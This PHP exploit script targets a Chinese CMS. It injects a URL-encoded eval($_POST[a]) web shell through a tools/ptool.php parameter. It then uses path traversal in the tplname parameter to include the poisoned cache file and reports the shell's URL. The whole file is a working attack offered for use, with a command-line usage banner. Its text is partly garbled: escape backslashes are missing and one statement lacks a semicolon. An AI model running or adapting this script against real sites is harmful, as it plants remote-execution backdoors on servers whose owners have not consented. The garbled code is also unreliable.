<?php
/* 
    exp:        index.php?tplname=../../dynamic/stats/aclicks.cac
    汽车CMS Shell:    /dynamic/tplcache/common/....dynamicstatsaclicks.cac.php
    装修CMS Shell    /dynamic/dynamic/stats/aclicks.cac.php 
*/
//$exp = /tools/ptool.php?aid=<?php eval($_POST[a]);
$exp = '/tools/ptool.php?aid=%3C%3Fphp%20eval%28%24_POST%5Ba%5D%29%3B%3F%3E';
//$exp1 = /index.php?tplname=../../dynamic/stats/aclicks.cac
$exp1 = '/index.php?tplname=..%2f..%2fdynamic%2fstats%2faclicks.cac';
 
if ($argc < 2 ) 
{
print_r('
+---------------------------------------------------------------------------+
 [+] php '.$argv[0].' [url]www.08sec.com[/url] 
+---------------------------------------------------------------------------+
');
    exit;
}
error_reporting(E_ERROR);
set_time_limit(0);
 
$host = $argv[1];
go($host);
 
function go ($host)
{
    global $exp,$exp1;

    $re = Send ($host,$exp);
    stripos($re, "MySQL") > 0 ? Send ($host, $exp) : ""
    $re = Send($host, $exp1) && stripos($re, "aclicks.cac") > 0 ? exit(" + Exploit Success!rn + http://$host/template/dynamic/stats/aclicks.cac.phprn") : exit(" - Exploit Failed!n");
}
 
function Send($host,$url)
{
    $data = "GET $url  HTTP/1.1rn";
    $data .= "Host: $hostrn";
    $data .= "User-Agent: Mozilla/4.0 (compatible; MSIE 5.0; Windows 2000) Opera 6.03 [en]rn";
    $data .= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8rn";
    $data .= "Content-Type: application/x-www-form-urlencodedrn";
    $data .= "Accept-Language: en-usrn";
    $data .= "Connection: Closernrn";
    $fp = @fsockopen($host, 80);
    if (!$fp) 
    {
        die("[-] Connect to host Errorrn");
    }
    fwrite($fp, $data);
    $back = '';
    while (!feof($fp)) 
    {
        $back .= fread($fp, 1024);
    }
    fclose($fp);
    return $back;
}
?>
